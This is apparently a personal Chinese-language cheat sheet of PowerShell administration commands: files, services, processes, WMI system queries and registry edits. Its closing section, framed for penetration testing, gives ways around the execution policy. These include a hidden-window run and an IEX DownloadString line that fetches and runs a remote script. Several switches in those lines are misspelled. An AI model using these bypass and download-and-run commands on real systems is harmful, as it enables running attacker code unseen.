@@ -1,0 +1,193 @@
+
+	https://www.cnblogs.com/gq0324/p/11193407.html
+
+
+	
+	
+查看 PowerShell 版本
+	get-host
+	$host.version
+	$PSVersionTable.PSVERSION
+
+新建目录
+	New-Item test -type Directory
+
+新建文件
+	New-Item test.txt -type File
+
+删除目录或文件
+	Remove-Item 文件或目录
+	
+
+显示文本内容
+	get-content 1.txt
+
+
+设置文本的内容
+set-content 1.txt -value "hell,word!"
+
+
+追加文本内容
+Add-Content 1.txt -Value "i love you"
+
+清除内容
+Clear-Content 1.txt
+
+
+查看 PowerShell 的执行策略
+Get-ExecutionPolicy
+
+Restricted 为脚本不能运行，是默认设置
+Unrestricted 为允许所有的脚本运行
+RemoteSigned 为只能运行本地创建的脚本，不能运行从网上下载的脚本，除了有数字签名证书
+Allsigned 为只运行有受信任的发布者签名的脚本
+
+设置 Powershell 的执行策略
+Set-ExecutionPolicy Unrestricted
+
+查看操作系统版本信息
+systeminfo /FO CSV | ConvertFrom-Csv
+
+
+
+查看部分组策略
+gpresult /Z
+
+
+
+查看部分组策略(需要导出到文件)
+secedit /export /cfg c:sec_result
+
+
+
+查看服务
+Get-Service
+
+
+
+查看运行中服务 
+Get-Service | Where-Object {$_.Status -eq 'Running'}
+
+
+
+查看IP
+ipconfig /all
+Get-NetipConfiguration
+
+
+
+查看进程
+Get-Process
+
+
+
+查看已安装补丁
+Get-WmiObject -Class Win32_QuickFixEngineering
+wmic qfe list
+
+
+
+查看使用Windows Installer安装的程序
+Get-WmiObject -Class Win32_Product | Format-Wide -Column 1
+
+
+
+查看CPU相关信息
+get-wmiobject win32_processor
+
+
+
+查看CPU使用率2008/2012通用
+Get-WmiObject win32_processor  | select SystemName, LoadPercentage
+
+
+
+查看系统版本/序列号
+gwmi win32_OperatingSystem
+
+
+
+查看总内存
+Get-WmiObject win32_OperatingSystem FreePhysicalMemory
+
+
+
+查看磁盘总空间（单位MB）
+Get-WMIObject Win32_LogicalDisk |Where-Object{$_.Size}|Foreach-Object { 'Disk {0} has {1:0.0} MB totalspace' -f $_.Caption, ($_.Size / 1MB) }
+
+
+
+查看防火墙状态
+netsh advfirewall show currentprofile
+
+
+
+查看BIOS信息
+Get-WMIObject -Class Win32_BIOS
+
+
+
+查看主板信息
+Get-WMIObject -Class Win32_Baseboard
+
+
+
+查看逻辑磁盘信息
+Get-WMIObject -Class Win32_LogicalDisk 
+
+
+
+查看物理磁盘信息
+Get-WMIObject -Class Win32_DiskDrive
+
+
+
+查看桌面设置(屏保是否设置)
+Get-CimInstance -ClassName Win32_Desktop
+
+
+
+查看一个文件夹内的文件及目录
+Get-ChildItem -Path C: -Force
+
+
+重启服务器
+Restart-Computer
+Restart-Computer -Force
+
+关闭服务器
+stop-computer
+
+停止spooler服务
+Stop-Service -Name spooler 
+
+启动spooler服务
+Start-Service -Name spooler
+
+重启spooler服务
+Restart-Service -Name spooler
+
+停止某个进程
+stop-process -id 2792
+
+锁定服务器
+rundll32.exe user32.dll,LockWorkStation
+
+新增注册表项
+​New-Item -Path hkcu:software_DeleteMe
+
+删除注册表项
+Remove-Item -Path hkcu:Software_DeleteMe
+
+
+如果要运行PowerShell脚本程序，必须用管理员权限将Restricted策略改成Unrestricted，所以在渗透时，就需要采用一些方法绕过策略来执行脚本，比如下面这三种。
+
+1.绕过本地权限执行
+上传xxx.psl至目标服务器，在CMD环境下，在目标服务器本地执行该脚本。
+powerShell.exe -Executionpolicy Bypass -File xxx.psl
+
+2.本地隐藏绕过权限执行脚本
+powerShell.exe -Executionpolicy Bypass -WindowStyle Hidden -NoLogo -Nonlnteractive -NoProfole -File xxx.psl
+
+3.用IEX下载远程PSl脚本绕过权限执行
+powerShell.exe -Executionpolicy Bypass-WindowStyle Hidden-NoProfile-NonI IEX(New-ObjectNet.webClient).DownloadString("xxx.psl");[Parameters]
